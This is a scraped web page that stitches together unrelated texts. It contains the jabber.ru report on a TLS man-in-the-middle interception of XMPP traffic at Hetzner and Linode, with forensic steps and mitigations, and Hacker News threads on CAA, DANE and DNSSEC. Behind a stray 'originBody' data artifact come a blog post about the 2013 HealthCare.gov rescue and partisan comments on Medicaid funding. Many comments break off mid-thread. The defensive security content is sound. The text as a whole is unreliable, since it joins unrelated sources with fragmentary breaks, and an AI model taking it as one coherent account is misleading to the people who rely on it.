The attacker has issued several new TLS certificates using Let’s Encrypt service which were used to hijack encrypted STARTTLS connections on port 5222 using transparent MiTM proxy. The attack was discovered due to expiration of one of the MiTM certificates, which haven’t been reissued. There are no indications of the server breach or spoofing attacks on the network segment, quite the contrary: the traffic redirection has been configured on the hosting provider network. The wiretapping may have lasted for up to 6 months overall (90 days confirmed). We believe this is lawful interception Hetzner and Linode were forced to setup. Last updated: 20 Oct 2023 Introduction oxpa, experienced UNIX administrator who is in charge for the oldest Russian XMPP service jabber.ru established in year 2000, was puzzled by “Certificate has expired” message upon connecting to the service on 16 October 2023. All the certificates seemed to be up-to-date on the server, but the connection to port 5222 (XMPP STARTTLS) was presenting an outdated certificate to the client. During all kinds of software, network and configuration checks with the help of other professionals and ejabberd software author, it was discovered that: The software serves proper, non-expired certificate in the network traffic The expired certificate is not present on the server It is based on other private key and was never issued by the server’s acme.sh certificate issuing script Incoming TCP connections to port 5222 are altered: they have different source port, SEQ/ACK numbers, and appear to arrive without any intermediate routing hops (TTL=64). This behavior is not observed on other, non-5222 ports, such as 5223 XMPP TLS port The affected machines are dedicated server on Hetzner and two virtual servers on Linode, all hosted in Germany. Traffic dump on port 5223, all the data intact as it should be. Traffic dump on port 5222, the connection is hijacked on application level (L7), the server receives replaced ClientHello message from the client. Incident investigation It was apparent that the connections on port 5222 are under Man-in-the-Middle attack which intercepts encrypted communications. At first we had 2 hypothesis to check: whether the servers have been hacked and whether the traffic is altered due to some kind of local network (neighbor) spoofing. For the server, we tested: All kind of logs Date of executable files and libraries modification Running processes, memory maps and “dangling” file descriptions of each of them Presence of userland LD_PRELOAD hijacking libraries with statically compiled busybox Presence of kernel-level hijacking modules by dumping the kernel memory with LiME and analyzing with volatility But nothing stood out. We noticed the only uncommon record in the kernel log on Hetzner dedicated machine, it lost the physical network link for 19 seconds on 18 July 2023: [Tue Jul 18 12:58:29 2023] igb 0000:04:00.0 enp4s0: igb: enp4s0 NIC Link is Down [Tue Jul 18 12:58:48 2023] igb 0000:04:00.0 enp4s0: igb: enp4s0 NIC Link is Up 1000 Mbps Full Duplex, Flow Control: RX/TX In addition, Linode machines are only used as a tunnel to Hetzner server as an alternative route, and are running only bare-bones basic services like SSH and NTP. Yet we still see unaltered ServerHello packet from the Hetzner server in Hetzner↔Linode tunnel on Linode machine, which is alerted upon sending it to the client over Linode network interface. In other words, the encrypted connection interception of the same kind happens both on Hetzner dedicated and Linode VPS machines. Note about kernel memory dump From the network perspective, we tested: Whether MAC address of the gateway have been altered with ARP spoofing Whether any single IP address in L2 segment replies multiple times for ARP request Whether rogue routing rules are present in the routing table (injected e.g. with ICMP redirect) Netfilter rules The presence of non-trivial-to-discover tunnels, such as IPsec (ip xfrm) No sights of any hijacking by the network segment neighbors on either servers, nothing out of ordinary in the network configuration. While it’s still not uncommon to see insufficient spoofing protection on physical networks for dedicated servers, it’s hard to believe that such sophisticated stealth spoofing is possible on a virtual infrastructure. On the Linode machines there aren’t any neighbors at all except the router. Affected Linode machines are unable to ARP-discover or ping any adjacent IP addresses in the same network segment which are perfectly functioning from the outside network. \"That’s weird\", I thought. The unaffected (third-party) Linode VM can ping its neighbors. It is connected to the Cisco systems router: # ip neigh 172.104.234.1 dev eth0 lladdr 00:00:0c:9f:f0:05 REACHABLE OUI lookup: 00:00:0C Cisco Systems, Inc However the affected VPS are connected to some unidentified MAC manufacturer: # ip neigh 172.104.226.1 dev eth0 lladdr 90:de:01:49:76:ae REACHABLE OUI lookup: (no matches) It became clear that the affected Linode VM have uncommon network setup compared to regular Linode instances, possibly have been isolated into separate VLAN. Certificates After checking crt.sh certificate transparency database, rogue certificates have been discovered which were not issued by any of jabber.ru servers. There are two genuine certificates used in XMPP service: the one issued for xmpp.ru, *.xmpp.ru and the other one is for jabber.ru, *.jabber.ru. The maliciously-issued certificates are slightly different from the regular ones for these domains: either the wildcard Subject Alternative Name is missing or a single certificate is issued for both jabber.ru, xmpp.ru. Moreover, MiTM configuration on xmpp.ru domain (which points to Linode servers) was slightly misconfigured: it serves only xmpp.ru certificate, yet the original server is configured to serve both jabber.ru and xmpp.ru certificates depending on requested XMPP domain.

This is a rare (mis)configuration which could be used as one of the XMPP MiTM detection fingerprint. Regular SSL/TLS libraries are usually compiled without anonymous ciphers support, you won’t be able to configure your service to use anonymous ciphers even if you explicitly allow it in configuration file most of the time, and it is confirmed to be not configured on the original server. $ ./testssl.sh --starttls xmpp --xmpphost jabber.ru --standard --openssl-timeout 15 --connect-timeout 15 jabber.ru:5222 ########################################################### testssl.sh 3.0.8 from https://testssl.sh/ (abdd51d 2022-09-28 09:19:37) This program is free software.

Summary and finale The attacker managed to issue multiple SSL/TLS certificates via Let’s Encrypt for jabber.ru and xmpp.ru domains since 18 Apr 2023 The Man-in-the-Middle attack for jabber.ru/xmpp.ru client XMPP traffic decryption confirmed to be in place since at least 21 July 2023 for up to 19 Oct 2023, possibly (not confirmed) since 18 Apr 2023, affected 100% of the connections to XMPP STARTTLS port 5222 (not 5223) The attacker failed to reissue TLS certificate and MiTM proxy started to serve expired certificate on port 5222 for jabber.ru domain (Hetzner) The MiTM attack stopped shortly after we begun our investigation and network tests on 18 Oct 2023, along with tickets to Hetzner and Linode support team, however passive wiretapping (additional routing hop) is still in place at least on a single Linode server Neither servers appear to be hacked Both Hetzner and Linode network appear to be reconfigured specifically for this kind of attack for the XMPP service IP addresses All jabber.ru and xmpp.ru communications between these dates should be assumed compromised. Given the nature of the interception, the attacker have been able to execute any action as if it is executed from the authorized account, without knowing the account password. This means that the attacker could download account's roster, lifetime unencrypted server-side message history, send new messages or alter them in real time. End-to-end encrypted communications, such as OMEMO, OTR or PGP, are protected from the interception only if both parties have validated the encryption keys. The users are asked to check their accounts for new unauthorized OMEMO and PGP keys in their PEP storage, and change passwords. We tend to assume this is lawful interception Hetzner and Linode were forced to setup based on German police request. Another possible, although much more unlikely scenario is an intrusion on the internal networks of both Hetzner and Linode targeting specifically jabber.ru — much harder to believe but not entirely impossible. As of 20 Oct 2023, we’re still waiting for the adequate reply from Hetzner and Linode to our inquiries. Could you prevent or monitor this kind of attack? There are several indications which could be used to discover the attack from day 1: All issued SSL/TLS certificates are subject to certificate transparency. It is worth configuring certificate transparency monitoring, such as Cert Spotter (source on github), which will notify you by email of new certificates issued for your domain names Limit validation methods and set exact account identifier which could issue new certificates with Certification Authority Authorization (CAA) Record Extensions for Account URI and Automatic Certificate Management Environment (ACME) Method Binding (RFC 8657) to prevent certificate issue for your domain using other certificate authorities, ACME accounts or validation methods Monitor SSL/TLS certificate changes on all your services using external service Monitor MAC address of default gateway for changes \"Channel binding\" is a feature in XMPP which can detect a MiTM even if the interceptor present a valid certificate. Both the client and the server must support SCRAM PLUS authentication mechanisms for this to work. Unfortunately this was not active on jabber.ru at the time of the attack.",

Even if this is a physically dedicated server, they can extract the private key from the RAM by dumping the RAM contents after unscheduled reboot.

The attacker would just request the exact cert configuration that is permitted by CAA. Maybe this helps if you can strengthen one validation method?Author of ACME-CAA (RFC 8657) here. ACME-CAA can mitigate this because you can put a unique identifier for your ACME account in the CAA record, so it is not possible for an attacker to do this unless they can get your ACME account private key (or coerce the ACME service). This assumes you have DNSSEC-secured nameservers, of course, otherwise DNS requests can potentially also be intercepted when queried by the CA.See RFC 8657 for a full list of security caveats. The RFC is designed to be more readable than most.Blogpost by me with more background: https:&#x2F;&#x2F;www.devever.net&#x2F;~hl&#x2F;acme-caa-live reply hlandau 13 hours agorootparentSmall update: I&#x27;ve just written a blogpost with my thoughts on the incident. https:&#x2F;&#x2F;www.devever.net&#x2F;~hl&#x2F;xmpp-incidentI usually brood on blogposts for days before publishing them since I care a lot about getting things accurate, but this is a bit of the moment, so here goes.

Everyone who has infra MitM in their threat-model should look into and enable this.Also, thank you for your work as well as popping in here.Am I overstating it by seeing it as one of the most important milestones for Internet security in general over the past few years?Do you have a take on DLT-based systems and if this is something that is (or could be) seriously discussed? It seems to me that the issues we have with PKI and certificate transparency could actually be mitigated very well if blockchain was seriously considered. reply hlandau 10 hours agorootparentSo I assume DLT is a generic&#x2F;more general term for blockchain technology.There&#x27;s this thing called Zooko&#x27;s triangle (https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Zooko%27s_triangle), basically the premise that an identifier can only have two of the following properties: secure, decentralized, human-readable.But a blockchain can actually be used to square this triangle and get all three. The original example of this is the Namecoin project, a fork of Bitcoin using a lightly modified Bitcoin codebase which can be used as a key-value store.The idea is that a blockchain can be used to create a decentralized database mapping keys (domain names) to values (which can be things like IP addresses, but also PKI trust anchors, similar to DANE). Thus this can eliminate the need for a CA. You can also use it to map human-readable names to .onion addresses. There is also root-of-trust transparency built in since the contents of the database is public and any changes are also public. The right to change a key-value entry belongs to the public key of the person who registered that key. Nobody can override this. Namecoin domain names use the .bit (unofficial) TLD.It&#x27;s a really neat technology and also makes things like censorship via domain suspensions, your registrar getting hacked, etc. infeasible.Full disclosure, I previously worked on the Namecoin project, I authored the DNS resolution daemon and the technical specification for the format of DNS data in the KV store. Unfortunately public interest in the project has waned, and deployment is the real issue - you have to have the client software to be able to resolve these domain names. There is at least some conceivable possibility Tor might ship it in their bundle in the future though, so people could type example.bit in Tor Browser to get to a hidden service. The project remains active though. reply Groxx 10 hours agorootparentprevInteresting and I can see some of the benefits, particularly in preventing DNS controllers from going to other CAs and making new keys, but... this all seems like a weird run-around for the MITM part.Couldn&#x27;t you exchange public keys with LetsEncrypt (in the web UI) and encrypt the response so you can&#x27;t be MITMed? Why is http even an issue? reply KairuByte 7 hours agorootparentBecause the attacker can simply request new keys. There’s nothing stopping them from going “hey LE, I need a new key! This is my domain, here is the challenge, give me my cert!” And LE will oblige, because as far as it can tell, they are you.Edit: To be clear, this is a problem with a solution. But you asked why simply throwing a LE cert into the mix wouldn’t prevent the issue. reply Groxx 7 hours agorootparentOwnership is already handled by checking DNS (and this thread covers a way to make that even more secure, which LE supports), and as far as I can tell neither has nothing to do with preventing MITM between LE and your servers.And no, I don&#x27;t mean throwing LE certs around to prevent MITM - this whole article is about the difficulties before having an LE cert, so that&#x27;s necessarily excluded.I&#x27;m wondering \"why not client certificates\". They&#x27;re a well established way to stop MITM, seems like a simple choice for the ownership validation step. reply crosser 15 hours agorootparentprevCould you please elaborate the reasons to implement this outside of DANE (RFC-7671) framework? reply fanf2 15 hours agorootparentCAA is about preventing certificate mis-issuance, which is what happened in this attack. DNSSEC and CAA could have prevented this attack from being performed the way it was, by thwarting the MITM on ACME.DANE is about changing the way certificates are authenticated. DANE makes it possible to authenticate certificates without getting them issued by a well-known CA. So CAA records are not particularly relevant to DANE. You can use DANE with certificates issued by a CA, which gives you two ways to authenticate the certificate; in this situation CAA secures one path and DANE the other.I am one of the co-authors of the DANE SRV RFC https:&#x2F;&#x2F;www.rfc-editor.org&#x2F;rfc&#x2F;rfc7673 which is what XMPP would use. I don’t follow XMPP development so I don’t know if it has been deployed. I would like it if DANE were more widely used, but it’s not pertinent to this attack. reply hlandau 13 hours agorootparentYeah. I used to be 100% in on DANE and against CAs. I&#x27;m still 100% for DANE but I now think DANE using existing CAs is the better option in many cases because it means things get CT logged. We don&#x27;t have a DNSSEC transparency situation right now. OTOH there is one undersung issue with CAs, which is that Let&#x27;s Encrypt isn&#x27;t as universally available as people think (see the US embargo list) and that does potentially make access to the internet harder for some.There are some use cases where DANE is actually winning real victories and is actually more viable than the existing CA infrastructure - site-to-site SMTP, for example. reply fanf2 13 hours agorootparentYeah, Viktor Dukhovni has been impressively energetic and persistent at improving the security of email. reply KirillPanov 1 hour agorootparentprevI feel like packet size was and continues to be a major obstacle for DNSSEC. Do you know why the DNSSEC&#x2F;DANE world hasn&#x27;t simply acknowledged this and switched to requiring ECC?It is trivial to fit several compressed curve points (i.e. signatures) in a single packet, whereas you can&#x27;t even fit two RSA signatures in a minimum-safe-to-assume DNS UDP reply packet after accounting for padding and ASN.1 overhead.I get the feeling that there is some faction that really hates UDP and they sort of hijacked the DNSSEC situation to use as a lever to force people to allow DNS-over-TCP.That seems to be backfiring, however, and DNSSEC has wound up taking a bullet for the UDP-haters.Many very-large networks simply can&#x27;t afford for their DNS traffic to be exposed to TCP&#x27;s intrusion-detection malleability and slowloris (resource exhaustion) attacks. These networks appear to be simply ignoring the \"thou must TCP thine DNS\" edict. DNSSEC is not a good enough carrot for them. I think ditching RSA would have been a more pragmatic choice than ditching UDP or skipping DNSSEC. reply crosser 14 hours agorootparentprevWhy not? You could use \"certificate usage\" value 1 and (if the implementation does not neglect it) immediately notice that validation by CA disagrees with validation by DNS. That should be good enough, no? reply tialaramex 15 hours agorootparentprevDANE assumes we can successfully deploy this to the entire Internet. It is unclear that&#x27;s ever possible, and it&#x27;s certainly not possible today. Lots of things would be great if you can deploy them, for example you wouldn&#x27;t build QUIC on top of UDP since you can \"just\" deploy a new transport protocol - except nope, for the foreseeable future that&#x27;s undeployable.A public CA generally has a more sophisticated relationship with their network transit provider or (hopefully) providers and can get DNSSEC actually working as intended for them.So this means mything.example&#x27;s DNS services and some public CA both need working DNSSEC, but the visitors to mything.example, such as your mom&#x27;s sister or some guy who just go into mything but isn&#x27;t entirely clear whether Apple make Windows - do not need DNSSEc, for them everything works exactly as before, yet the certificate acquisition step is protected from third parties.Would that help? It depends. reply aaomidi 15 hours agorootparentprevYep!

It is worth configuring certificate transparency monitoring, such as Cert Spotter (source on github), which will notify you by email of new certificates issued for your domain names* Limit validation methods and set exact account identifier which could issue new certificates with Certification Authority Authorization (CAA) Record Extensions for Account URI and Automatic Certificate Management Environment (ACME) Method Binding (RFC 8657) to prevent certificate issue for your domain using other certificate authorities, ACME accounts or validation methods* Monitor SSL&#x2F;TLS certificate changes on all your services using external service* Monitor MAC address of default gateway for changes reply LinuxBender 19 hours agorootparentNice addition. Me personally being the paranoid type, I don&#x27;t trust the transparency log for monitoring but rather for writing up the root cause analysis. Reason being is that if someone can legally compel Hetzner and&#x2F;or Linode and&#x2F;or LetsEncrypt to do or not do something then the same entity can compel the certificate transparency site to ignore something. But you covered what I would do and that is to have multiple nodes doing active monitoring of TLS changes using an external service. That service being openssl s_client in my case.In the case of Jabber it might be interesting to add some monitoring in the application that uses a cryptographic signed payload to list all the valid fingerprints and send an alert message to the server if something odd is happening like public key pinning but without a hard-fail. That list could be pre-loaded with new certificate fingerprints prior to being deployed. If the oddness is confirmed then perhaps add some way to tell the clients that certificate is likely forged. That way both server operator and client are aware that something evil this way comes.[Edit] - Looks like based on the comment from MattJ100 that some Jabber servers and some clients can already do something like this. reply codedokode 10 hours agorootparentThe problem is that Let&#x27;s Encrypt issued a fake certificate without proper validation.UPD: I was initially wrong.

If you mean SCRAM, it was actually pretty novel when it was introduced because it allows the server to store a hash, the client to store a hash, and only a hash is exchanged over the wire.SCRAM also allows the client to verify that the server possesses the password (or a hash of it), so a MITM that just says \"yep, your credentials are correct - go ahead!\" can be detected.Channel binding is an addition to SCRAM (it&#x27;s usable outside of SCRAM too) that allows securely checking the TLS stream as well. Specifically it allows verification that the TLS stream is terminated by the same entity that has (a hash of) your password. reply mjl- 18 hours agorootparentprevno, scram is all about not exchanging and not storing plain text passwords. the plus variants add tls channel binding. reply mjl- 19 hours agorootparentprevDANE (with DNSSEC) may be an option to look at too, with public keys in DNS. though probably client support isn&#x27;t universal (i have no (recent) experience using jabber). the CA was one weak point here.checking for new public keys in certificates when keeping private keys between renewals would also help.i suppose any storage and possibly ram should also be considered compromised? e.g. private keys stored on disk without encryption, but also by being read into memory. especially on the vm. reply Avamander 18 hours agorootparentDNSSEC operators can be strong-armed the same way.

If the xmpp.ru and jabber.ru domains used DNSSEC and CAA, it would not have been enough for the MITM to strong-arm Linode and Hetzner: they would also have to strong-arm the domains’ DNS providers. I don’t think the attackers could have done it stealthily (unnoticed for 3 months) without the co-operation of the .ru registry and a MITM attack on all of the Let’s Encrypt validation vantage points.I am one of the co-authors of the DANE SRV RFC https:&#x2F;&#x2F;www.rfc-editor.org&#x2F;rfc&#x2F;rfc7673 which is what XMPP would use. I don’t follow XMPP development so I don’t know if it has been deployed. I would like it if DANE were more widely used, but it’s not pertinent to this attack. reply theamk 18 hours agorootparentprevI think it&#x27;s a great example why DNSSEC would be bad: at least here, we had transparency logs and there was a simple method to get an attack notification. With DNSSEC, there would be no such thing. reply rixthefox 17 hours agorootparentI disagree. Forging DNSSEC requires LE to strong arm the domain registrar to modify the DS keys per domain which would also require them pointing to an adversary DNS server to answer those requests with a valid signature. That action would definitely be noticed. Without DNSSEC you are back to square 1 of unsigned DNS that can be modified in-flight, a much worse situation. I personally believe we should be advocating for more DNSSEC, not less.What I think you&#x27;re advocating for is that DNSSEC should have it&#x27;s own transparency log that shows when domains update or cycle their DNSSEC KSK&#x2F;ZSKs which is a great idea, we would just need to get all the domain registrars on board as well which as we can already see with the transparency project, you can&#x27;t get buy in from everyone. reply theamk 9 hours agorootparentWell, with transparency project we _did_ get buy in from everyone because browsers (like Mozilla and Google) forced it. And there are severe penalties for not obeying transparency log, and well as technical measures to enforce it (for example certs with no CT log would not work in Chrome).This of course only works because there is competition. If TrustCor fails to behave, then this CA is dropped. Customers complain, but not very strongly - there are plenty of CAs around, it&#x27;s annoying to have to switch to another one but still eminently doable. And TrustCor is out of business completely, all their investment is permanently gone.With DNSSEC.. what do you do if you domain registrar does not play by the rules, say is caught double-issuing DS keys?Answer is: likely nothing. Most orgs are not going to move .com to .io because of that -- there links, SEO, even things like business cards. People would complain, _maybe_ registrar would get a fine for 0.0001% of their annual income (but I would not count on this). And that&#x27;s it, the system will stay insecure and they will continue to double-issue certificates.The separation of CA from registrar is a _feature_, and a very helpful one.

(this was also detected by monitors operated by myself and Cloudflare)But this is all moot when it comes to XMPP, since XMPP clients don&#x27;t check for SCTs, and there is no requirement for CAs to log certificates if they don&#x27;t need to work in non-CT-enforcing clients.

Ask anyone who works for a CA, or an ISP, or a registrar, or a mail hoster, or a browser manufacturer, or DNS provider... If you just read up on how PKI works, on how certificates get issued, how the network protocols work, etc, it&#x27;s all just right there. The holes are very well known and understood and not fixed because they&#x27;re in the design. Every so often somebody comes up with another mitigation, which of course you have to opt into, and still doesn&#x27;t solve all the holes.It&#x27;s like SS7, or SWIFT. It&#x27;s not bold to claim that all public phone networks and bank transfers are insecure, it&#x27;s just a fact. People who know what they are know they&#x27;re vulnerable.As an aside to the design issues, social engineering any of the thousands of organizations involved with issuing certs (not just CAs) is trivial.

Much less so around approaches involving data centers. reply Hello71 16 hours agoparent [–] according to the article, the added hop visible in traceroute to Linode machine is after two 10&#x2F;8 hops, so it&#x27;s likely an internal machine. more importantly, the affected VM has a strange gateway MAC address, which can only be controlled by the local network administrator, not an intermediate carrier. replyGuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",

    "originBody": "ABOUT BLOG PROJECTS Paul Smith The 10 Year Anniversary of the HealthCare.gov Rescue OCTOBER 18, 2023 Ten years ago today, on Friday, October 18, 2013, the effort to fix HealthCare.gov began in earnest. At 7:15 A.M. Eastern time, a small group assembled next to the entrance to the West Wing of the White House. The group included Todd Park, Brian Holcomb, Gabriel Burt, Ryan Panchadsaram, Greg Gershman, and myself. Later in the day we were joined by Mikey Dickerson via a long-running speakerphone call. Some of us were from outside of government (Gabe, Brian, Mikey, and me), and the others had jobs in government at the time (Todd, Ryan, and Greg). What we all had in common was that we were experienced technologists, having been at startups or at large established technology organizations. The members of our group were selected by Todd, working with Greg and Ryan and others behind the scenes to identify people who could help because they had that kind of technology experience. HealthCare.gov, having launched days earlier on October 1, 2013, wasn't working. From the vantage from the top of the political leadership in the country, it was clear outside help was needed. Todd, the CTO of the United States at the time, which is a position in the White House, was tapped to help fix it. His plan was to provide reinforcements to complement the team of government employees and contractors that had built HealthCare.gov and were in the midst of operating it. We were to be a small team, very discreet. Todd was our leader. It was already a high-pressure, stressful situation, so insertion into that context meant melding in, not blowing things up. It was to be a low-key mission of information gathering and assessment, not the cavalry storming in. Todd told us the next 30 days would be critical. The goals were to enroll 7 million people by March 31, 2014, the end of the period known as open enrollment. When the media was eventually informed of our existence by the White House, we were referred to as \"the tech surge\". When Todd called me two days prior on October 16 to ask me if I would join the effort, he didn't have to explain the stakes. I understood what it meant for the website to work. I immediately agreed, and put on hold what I was doing, which happened to be raising money for a startup I had founded. I took Todd's call while walking the grounds of the Palace of Fine Arts in San Francisco, having met with VCs earlier in the day. I was living in Baltimore at the time with my wife and toddler daughter. I flew back home right away, and before I knew it I was taking the earliest morning train I could from Camden Yards to DC's Union Station. I thought I had timed it right, but still wound up running across Pennsylvania Avenue so as not to be late. Photo by me as I hustled. Metadata says taken at 7:11 A.M., so must have just made it We couldn't have started any sooner even if we had wanted to. The federal government had shut down on October 1, the same day HealthCare.gov had launched. The shutdown prevented anyone from outside the main team working on HealthCare.gov from coming in to help. So while days passed with the news dominated by the twin stories of the shutdown and the slow-moving catastrophe of the launch, a vacuum of information formed, as well as a surplus of speculation and worry. The White House couldn't figure out what was wrong with it, and the implications of it failing were troubling. The Affordable Care Act, the signature domestic policy achievement of President Obama's tenure, had gone into effect, and the website was to be the main vehicle for delivering the benefits of the law to millions of people. If they didn't know what was wrong with HealthCare.gov, other than that it was manifestly not working, plain for everyone to see, and therefore they might not be able to fix it, what would that mean for the the fate of health care reform? Fortunately, the shutdown ended on October 17, which meant we could get to work and finally understand what was going on. Some of us already knew each other, but everyone was new to someone else. We introduced ourselves, headed inside, and after breakfast in the Navy Mess, headed upstairs to the Chief of Staff's office. Denis McDonough shook our hands as we somewhat awkwardly stood in a line. He asked us directly, \"can you fix it\"? In our nervous energy, I remember some of us blurting out, \"yes\". We had confidence, but we also were eager to dive in, learn as much as we could, and get going. A van was procured, along with a driver. We piled in and headed across the Mall to the Hubert H. Humphrey Building, headquarters of the US Department of Health & Human Services (HHS). Entering the lobby, we passed Secretary Kathleen Sebelius. She wasn't there for us, she was welcoming federal employees back to work after the shutdown. Our meeting there was with Marilyn Tavenner and her staff. Tavenner was the Administrator of the Centers for Medicare & Medicaid Services (CMS), the largest organization in HHS, and the owner of HealthCare.gov. My thermal printed visitor badge photo is pretty faded after 10 years Our meeting with Tavenner and her team yielded our first details of the system that was HealthCare.gov. We learned how it was structured and what its main functional components were. We heard first hand what CMS leadership knew about what was wrong, or at least where in the system they could see that things were not working. It was our first sense of the size and complexity of the site, both in terms of functionality, but also in terms of the number of contractors, sub-components, and business rules such as for eligibility. But remember, these were not technical people - they were health policy experts and administrators. Most of the things they were reporting to us were business metrics about the site, descriptions of high-level performance. It was helpful to hear this perspective, and indeed many of these metrics would drive our later work. But this would not yet be the time to learn about the technical challenges the team was facing. Our morning continued back in the van, leaving DC for CMS headquarters in Woodlawn, Maryland, just outside Baltimore, a 45-minute drive. Here we met with the leadership of HealthCare.gov itself, a group of people including Michelle Snyder, CMS's COO, Henry Chao, one of its main architects, and Dave Nelson, a director with a telecom background, who was being elevated and would oversee much of the rescue work from CMS's perspective. The sketchy picture of HealthCare.gov we had was coming into greater relief. We learned about deployment challenges and bottlenecks, more about where specifically users were getting \"stuck\" using the site, and we started to hear bits and pieces about the particular technologies being used, including something called MarkLogic, an XML database, which was new to us. We even started to get some details about the deployment architecture and the types of servers involved. Again, the theme of complexity stood out. But we were also still talking at a fairly high level. To really understand what was wrong with HealthCare.gov, we'd have to move on. The afternoon was spent a few miles down the road back toward DC in Columbia, Maryland, at something called the XOC, or Exchange Operations Center. This was to be the mission-control-style hub of operations for HealthCare.gov. We found a room staffed with a few contractors and some CMS employees. (The XOC eventually would be the site of so much activity during the rescue that a scheme to keep people out was needed.) Here was where, away from the leadership-filled rooms, we finally heard from technologists who were directly working on the site. What we heard was troubling. There was a lack of confidence in making changes to the source code. A complex code generation process governed much of the site and produced huge volumes of code, requiring careful coordination between teams. Testing was largely a manual process. Releases and deployment required lengthy overnight downtimes and often failed, required equally-lengthy rollbacks. The core data layer lacked a schema. Provisioning hosting resources was slow and not automated. Critically, there was a pervasive lack of monitoring of the site. No APM, no bog-standard metrics about CPU, memory, disk, network, etc., that could be viewed by anyone on the team. By this point, the looks we exchanged amongst ourselves betrayed our fears that the situation was much worse than we initially expected. I carried with me that day a Moleskin notebook that I furiously scribbled in so as not to forget what I was hearing. You can see as the day worn on my panic start to rise reflected in my writing. Incredulous that they didn't have monitoring With that dose of reality and the evening setting in, we collected ourselves back in the van and set off for our final field trip of the day, to suburban Virginia for the offices of CGI, the prime contractor of HealthCare.gov. In Herndon, we were greeted by many people on their leadership team and the technical teams who had built the site, even though it was getting on past business hours at this point. This was as much an interview of us by them as it was a chance for us to ask questions. We had a brief opportunity to ingratiate ourselves and win their trust. We did that in part by showing our eagerness to dig in on some of the things we had learned earlier in the day, proving our engineering bona fides (specifically with high-traffic websites), and emphasizing that we were not there for any other reason than to help. This was a team on edge, under the gun and exhausted. We needed them to succeed, and they weren't going to work with us if they thought we were there to cast blame. We asked many questions, but they mostly boiled down to, what's wrong with the site, and how do you know what's wrong? Show us where in the system this or that component isn't performing the way you expected. And they and CMS mostly couldn't do that. They had daily reporting and analytics that produced those high level business metrics. But again there was that lack of monitoring of the system itself, real-time under load. So we focused on that. It was getting late. Could we throw a Hail Mary? Walk out of that building leaving behind something of tangible value, something promising they could build on? We said, there's lots of APM-style monitoring services, but we're familiar with New Relic. Could we install it on a portion of the servers? Yes, we know there's a complicated and fragile release process, but if we bypassed that and just directly connected to some of the machines, we could install the agent on them and be receiving metrics almost immediately. Glances were exchanged. A CMS leader in the room made a call on their cell phone - we actually have some New Relic licenses already, we can use those. There was also a hestitancy to see if this kind of extraordinary, out-of-the-norm request would be approved - clearly, even during this period of turmoil, all the stakeholders stuck to the regular release script. The CMS leader nodded their approval. A small group assembled to marshall the change through. Many folks had stuck around, even though it was nearing midnight. Then on a flatscreen in the conference room, we pulled up the New Relic admin, and within moments, the \"red shard\" (the subset of servers we had chosen for this test) was reporting in. And there it was - we could see clearly the spike in request latency, even at this late hour, that indicated a struggling website, along with error rate, requests per minute, and other critical details that had basically been invisible to the team to that point. Imagine a hospital ICU ward without an EKG monitor. Now that they knew exactly in what ways it was bad, they could start to correlate them with the business metrics and other aspects of the site that needed improving. They could then prioritize the fixes and actions that would yield the biggest improvements. Photo by me. Taken at 1:50 A.M. on Saturday, October 19, 2013. That would come later. For now, exhausted, well past midnight, we left Herndon and rode the van back to DC. At roughly 2 A.M. we reconvened in the Roosevelt Room in a completely silent White House for a quick debrief. As we reflected on what we had just experienced, another thought was settling in over the group - that this was obviously not over by any stretch, that none of us were going home any time soon, that the challenge was much larger in scope than we had imagined, that any notion we may have had at the outset of possibly just offering some suggested fixes and moving on was in retrospect hilariously naive, that this was all we were going to be doing for the foreseeable future until the site was turned around. Indeed, we all managed to find a few hours of sleep in a nearby hotel and then were right back at it in the morning, heading straight out to Herndon. This was just day one, a roughly 18-hour day, and it certainly wasn't the last such marathon. Over the next two-and-a-half months until the end of December, the tech surge expanded and took on new team members, experienced many remarkable events and surprises, and ultimately, successfully helped turn HealthCare.gov around. Millions enrolled in health care coverage that year, many for the first time. I hope to tell more stories of how that happened over the next few weeks and months.

A rhetorical tool used since time immemorial. reply AnthonyMouse 3 hours agorootparentprev> Would you also take federal money to expand medicaid coverage to the poor citizens of your state?The federal money is an extortion scheme.The way federal programs nominally work is that people with money pay taxes to fund the programs. The people with money disproportionately live in certain states, which is the justification for making it a federal program -- then you can have a uniform national program even if some states don&#x27;t have the tax base to provide it themselves.But then the representatives from the states with money make it so the federal government doesn&#x27;t fund the entire program. This benefits them first because they can shift some of the tax burden from the rich taxpayers in their state to the poorer taxpayers in some other state where any of the program&#x27;s beneficiaries are. It tries to force every state to fund part of the program from their own tax base even if the people in that state didn&#x27;t want it, because the alternative is to pay the federal taxes anyway but not get any of the federal money.Then it benefits rich people again because the rich states, of course, implement the programs and get the federal money, but any state that refuses the scheme that disadvantages them is still paying federal taxes and gets nothing. So now you&#x27;re getting a transfer of wealth from poorer states to richer states -- a penalty the representatives from the richer states intended when they constructed the program that way.But the poorer states may not have the money to fund the state&#x27;s portion of the program, and in any event refusing it is the only way the state government has to protest the federal program being constructed in that way. It puts pressure on that state&#x27;s federal representatives to reform or remove the program.So don&#x27;t blame the poorer states for not implementing the program, blame the richer states for passing it without funding it. reply snowwrestler 2 hours agorootparentStates pay for the health care of their poor residents either way.Residents who do not have private or public health coverage still get health care. They go to the ER when they need help and they receive care in the most transactional and expensive way possible.

Adding an intermediary allows programs to be scuttled and money diverted (if not outright stolen) by other programs and participants.As an example, Texas refused free money from the Federal government for Medicaid expansion, amounting to $5-6 billion per year [2].[1]: https:&#x2F;&#x2F;www.cbpp.org&#x2F;research&#x2F;income-security&#x2F;lessons-from-t...[2]: https:&#x2F;&#x2F;www.statesman.com&#x2F;story&#x2F;news&#x2F;politics&#x2F;politifact&#x2F;202... reply ThunderSizzle 13 hours agorootparentTo be fair, there is no such thing as \"free money\". Every \"free\" dollar the feds give out is that much more inflation and devaluation of the dollar, and it&#x27;s been skyrocketing every since the Feds started giving out this type of free money to the states.I doubt Texas refused on this principal, but states viewing Federal money as free is irksome. It&#x27;s not free. It&#x27;s a hidden tax on both your current citizens in terms of devaluation of their savings, and future citizens to pay off the debt the Feds are creating with this \"free\" money.Talking about inefficiency - it&#x27;d probably be significantly more efficient to stop requiring this money to funnel through DC.

In the last few weeks of the year they did pass a continuing resolution saying something along the lines of \"continue the government funding for 2 months at last year&#x27;s levels until we pass a more complete new budget, and also repeal the Affordable Care Act\".

